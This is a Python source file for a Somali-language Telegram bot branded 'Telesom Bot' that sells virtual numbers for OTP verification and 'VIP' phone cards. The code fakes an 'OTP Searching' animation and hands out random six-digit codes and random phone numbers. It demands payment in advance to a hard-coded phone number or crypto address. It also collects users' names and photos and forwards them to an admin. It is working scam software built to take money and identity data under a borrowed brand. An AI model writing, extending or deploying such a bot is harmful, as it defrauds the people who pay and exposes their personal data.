import os
import random
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ===== STORAGE =====
user_orders = {}
confirmed_codes = {}

# ===== STATES =====
class CodeState(StatesGroup):
    waiting_code = State()
    waiting_name = State()
    waiting_photo = State()

# ===== HELPERS =====
def generate_code():
    return "".join(random.choice("0123456789") for _ in range(6))

# ===== START =====
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="New Order"), KeyboardButton(text="Check Code")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(F.text=="New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro nooca Order:", reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton(text="TIKTOK", callback_data="tiktok")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="telegram")],
        [InlineKeyboardButton(text="GOOGLE", callback_data="google")]
    ])
    await call.message.edit_text("Dooro Adeeg:", reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp", "tiktok", "telegram", "google"]))
async def service_selected(call: CallbackQuery):
    service = call.data
    user_orders[call.from_user.id] = {"service": service, "paid": False}

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_payment")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel_payment")]
    ])
    await call.message.edit_text(
        "💵 Fadlan lacag ku dir:\n+252907868526\nKadib riix CONFIRM",
        reply_markup=kb
    )

@dp.callback_query(F.data == "cancel_payment")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

@dp.callback_query(F.data == "confirm_payment")
async def confirm_payment(call: CallbackQuery):
    msg = await call.message.edit_text("OTP Searching.")
    for i in range(5):
        await asyncio.sleep(1)
        dots = "." * ((i % 3) + 1)
        await msg.edit_text(f"OTP Searching{dots}")

    code = generate_code()
    confirmed_codes[call.from_user.id] = code

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{call.from_user.id}")]
    ])

    await bot.send_message(
        ADMIN_ID,
        f"New Payment Request\nUser: {call.from_user.id}\nCode: {code}",
        reply_markup=kb
    )

    await asyncio.sleep(5)
    await call.message.answer("PLEASE SEND MONEY 💵")

# ===== CARD =====
@dp.callback_query(F.data == "card")
async def card_menu(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro nooca Card:", reply_markup=kb)

@dp.callback_query(F.data == "vip")
async def vip_selected(call: CallbackQuery):
    numbers = "\n".join("06349"+str(random.randint(10000,99999)) for _ in range(3))
    user_orders[call.from_user.id] = {"type": "VIP", "number": numbers, "price": "$15"}
    kb = payment_keyboard()
    await call.message.edit_text(
        f"VIP Numbers:\n{numbers}\n\nPLEASE SEND MONEY BEFORE\nAND GET YOUR VIP CARD 💵",
        reply_markup=kb
    )

@dp.callback_query(F.data == "normal")
async def normal_selected(call: CallbackQuery):
    number = "063"+str(random.randint(1000000,9999999))
    user_orders[call.from_user.id] = {"type": "Normal", "number": number, "price": "$1"}
    kb = payment_keyboard()
    await call.message.edit_text(
        f"Number-kaaga:\n{number}\n\nPLEASE SEND MONEY BEFORE\nAND GET YOUR NORMAL CARD 💵",
        reply_markup=kb
    )

def payment_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL PAYMENT", callback_data="local")],
        [InlineKeyboardButton(text="CRYPTO CURRENCY", callback_data="crypto")]
    ])

@dp.callback_query(F.data == "local")
async def local_payment(call: CallbackQuery):
    await call.message.answer("Fadlan lacag ku dir:\n+252907868526")
    await send_admin_request(call.from_user.id)

@dp.callback_query(F.data == "crypto")
async def crypto_menu(call: CallbackQuery):
    await call.message.answer(
        "BNB Address:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "USDT-BEP20 Address:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`",
        parse_mode="Markdown"
    )
    await send_admin_request(call.from_user.id)

# ===== ADMIN REQUEST =====
async def send_admin_request(user_id):
    if user_id not in user_orders:
        return
    order = user_orders[user_id]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{user_id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"NEW ORDER\nUser ID: {user_id}\nType: {order.get('type','Virtual')}\nNumber:\n{order.get('number','')}\nPrice: {order.get('price','')}",
        reply_markup=kb
    )

# ===== ADMIN CONFIRM =====
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    user_id = int(call.data.split("_")[-1])
    code = confirmed_codes.get(user_id)
    await bot.send_message(user_id, f"Payment Confirmed ✅\nYour Code: {code}")
    await call.message.edit_text("Approved ✅")

# ===== CODE CHECK =====
@dp.message(F.text=="Check Code")
async def code_check(msg: Message, state: FSMContext):
    await msg.answer("Fadlan geli code kaaga:")
    await state.set_state(CodeState.waiting_code)

@dp.message(CodeState.waiting_code)
async def check_code(msg: Message, state: FSMContext):
    user_code = msg.text
    if user_code in confirmed_codes.values():
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="CARD 1", callback_data="card1")],
            [InlineKeyboardButton(text="CARD 2", callback_data="card2")],
            [InlineKeyboardButton(text="CARD 3", callback_data="card3")]
        ])
        await msg.answer("Dooro Card:", reply_markup=kb)
        await state.clear()
    else:
        await msg.answer("Code khalad ah ❌")

# ===== CARD SELECT =====
@dp.callback_query(F.data.in_(["card1","card2","card3"]))
async def card_select(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Magacaaga qor 3 jeer:")
    await state.set_state(CodeState.waiting_name)

@dp.message(CodeState.waiting_name)
async def get_name(msg: Message, state: FSMContext):
    await state.update_data(name=msg.text)
    await msg.answer("Fadlan sawirkaaga soo dir:")
    await state.set_state(CodeState.waiting_photo)

@dp.message(CodeState.waiting_photo, F.photo)
async def get_photo(msg: Message, state: FSMContext):
    data = await state.get_data()
    name = data.get("name")
    await bot.send_message(ADMIN_ID, f"User Card Request\nName:\n{name}")
    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id)
    await msg.answer("Request Sent To Admin ✅")
    await state.clear()

# ===== RUN =====
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
